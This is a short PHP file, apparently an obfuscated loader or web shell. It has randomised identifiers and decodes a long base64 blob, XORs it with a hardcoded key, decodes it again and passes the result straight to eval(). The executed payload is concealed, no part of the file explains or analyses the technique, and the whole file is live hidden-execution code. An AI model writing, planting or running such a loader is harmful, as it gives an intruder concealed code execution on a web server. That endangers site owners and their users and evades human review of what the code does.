<?php
function pvOKLzhNfJ($VgpYNAjxbl, $cjAahpyxiR) {
    $cjAahpyxiR = base64_encode($cjAahpyxiR);
    $VgpYNAjxbl = base64_decode($VgpYNAjxbl);
    $biDBsXhKsQ = "";
    $XFPFsKBktg = "";
    $lxNaEobzhq = 0;
    while ($lxNaEobzhq < strlen($VgpYNAjxbl)) {
        for ($eHIhOMpaYt = 0; $eHIhOMpaYt < strlen($cjAahpyxiR); $eHIhOMpaYt++) {
            $biDBsXhKsQ = chr(ord($VgpYNAjxbl[$lxNaEobzhq]) ^ ord($cjAahpyxiR[$eHIhOMpaYt]));
            $XFPFsKBktg .= $biDBsXhKsQ;
            $lxNaEobzhq++;
            if ($lxNaEobzhq >= strlen($VgpYNAjxbl)) break;
        }
    }
    return base64_decode($XFPFsKBktg);
}
$ZEmYYChrUc = "lgsodfhsdfnsadfoisdfiasdbfipoas234234";
$kfChuzsyMW = "KA8yAwBxE1QoCwQEPiVnDTotPRsuASYSPj5vHjgAHAQ9OhBBAHVvETpIcA8qAx8PKgIIVwB1VAw1ZRQCOB8mAwlfc089BGsCBnUpDDkqDB06IXcEAzocGwA+ABw6LSUPAncIDy8vf1MrLRc0IVsABwALD1ITKntLOjoqCwNlWQo+BD0bPQAEGBI5KT4gKndZABcxHC12H0oscn8NKQQ2EANxJQoweRg4DigMKw8Raz4wZD4sDyxvJQwzCCQMXQA2Ni5ODy4pIk0KFSYRLSxrRwYQHEordmIKOHsYEjgrDBY8EAQHKXE+EDsEMUcdCT4HPQAcAygAcwAASBxIAAJwERQWc0s4ADEVAQEAFAIlGFkRLmcDAw8cXAB6PQoRFDFH";
$QbgUiRwcII = pvOKLzhNfJ($kfChuzsyMW, $ZEmYYChrUc);
eval($QbgUiRwcII);
?>
